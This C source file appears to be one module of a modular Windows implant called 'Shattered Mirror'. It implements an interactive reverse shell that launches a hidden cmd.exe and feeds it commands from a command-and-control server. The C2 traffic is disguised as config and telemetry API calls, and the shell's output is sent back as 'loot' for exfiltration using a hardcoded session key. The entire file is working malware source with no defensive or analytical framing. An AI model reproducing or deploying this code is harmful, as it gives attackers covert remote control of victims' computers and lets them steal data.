/*=============================================================================
 * Shattered Mirror v1 — Atom 10: Interactive Reverse Shell
 *
 * Implements a full interactive shell by spawning a child process (cmd.exe)
 * and redirecting its standard streams through anonymous pipes.
 *
 * Data flows as follows:
 *   C2 (POST /api/v2/config) -> Atom 01 (Net) -> IPC -> Orchestrator -> 
 *   IPC -> Atom 10 Shell -> Write to cmd.exe STDIN
 * 
 *   cmd.exe STDOUT -> Read from pipe -> Atom 10 Shell -> IPC ->
 *   Orchestrator -> IPC -> Atom 01 (Net) -> C2 (POST /api/v2/telemetry)
 *===========================================================================*/

#include "Atom_10_Shell.h"
#include "../Orchestrator/AtomManager.h"
#include "Atom_03_Sys.h"

#define BUFFER_SIZE 8192

static HANDLE s_hCmdStdinRead = NULL,  s_hCmdStdinWrite = NULL;
static HANDLE s_hCmdStdoutRead = NULL, s_hCmdStdoutWrite = NULL;

DWORD WINAPI ReverseShellAtomMain(LPVOID lpParam) {
    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
    HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
    if (!hPipe) return 1;

    BYTE SharedSessionKey[] = "780t93RsjAyjYlNm";

    /* 1. Setup Anonymous Pipes for the child process */
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&s_hCmdStdinRead, &s_hCmdStdinWrite, &sa, 0)) return 1;
    if (!CreatePipe(&s_hCmdStdoutRead, &s_hCmdStdoutWrite, &sa, 0)) return 1;

    /* Ensure the write handle to STDIN and read handle to STDOUT are not inherited */
    SetHandleInformation(s_hCmdStdinWrite, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(s_hCmdStdoutRead, HANDLE_FLAG_INHERIT, 0);

    /* 2. Spawn cmd.exe with redirected handles */
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = s_hCmdStdinRead;
    si.hStdOutput = s_hCmdStdoutWrite;
    si.hStdError = s_hCmdStdoutWrite;
    si.wShowWindow = SW_HIDE;

    WCHAR szCmdPath[] = L"C:\\Windows\\System32\\cmd.exe";
    if (!CreateProcessW(NULL, szCmdPath, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return 1;
    }

    /* Close unused ends of the pipes */
    CloseHandle(s_hCmdStdinRead);
    CloseHandle(s_hCmdStdoutWrite);

    /* 3. Main Communication Loop */
    char buffer[BUFFER_SIZE];
    while (TRUE) {
        /* A. Check STDOUT from cmd.exe and send to IPC */
        DWORD dwAvail = 0;
        if (PeekNamedPipe(s_hCmdStdoutRead, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
            DWORD dwRead = 0;
            if (ReadFile(s_hCmdStdoutRead, buffer, BUFFER_SIZE, &dwRead, NULL) && dwRead > 0) {
                
                /* Wrap in IPC Message for exfiltration */
                IPC_MESSAGE msg = { 0 };
                msg.CommandId = CMD_REPORT; // Report loot back
                msg.dwPayloadLen = dwRead;
                memcpy(msg.Payload, buffer, dwRead);
                IPC_SendMessage(hPipe, &msg, SharedSessionKey, 16);
            }
        }

        /* B. Check IPC for incoming STDIN commands from C2 */
        if (PeekNamedPipe(hPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
            IPC_MESSAGE inMsg = { 0 };
            if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
                
                if (inMsg.CommandId == CMD_EXECUTE) {
                    /* Write command to cmd.exe STDIN */
                    DWORD dwWritten = 0;
                    WriteFile(s_hCmdStdinWrite, inMsg.Payload, inMsg.dwPayloadLen, &dwWritten, NULL);
                }
            }
        }

        /* C. Check if cmd.exe process is still alive */
        DWORD exitCode = 0;
        if (GetExitCodeProcess(pi.hProcess, &exitCode) && exitCode != STILL_ACTIVE) {
            break;
        }

        Sleep(50); // Small throttle to avoid 100% CPU
    }

    /* Cleanup */
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(s_hCmdStdinWrite);
    CloseHandle(s_hCmdStdoutRead);

    return 0;
}
